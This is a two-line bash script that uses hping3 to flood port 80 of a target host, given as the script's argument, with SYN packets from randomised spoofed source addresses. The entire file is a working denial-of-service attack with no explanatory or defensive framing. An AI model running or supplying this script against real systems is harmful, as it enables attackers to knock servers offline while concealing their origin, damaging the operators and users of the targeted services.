#!/bin/bash
hping3 -S --flood -V  --rand-source -p 80 $1
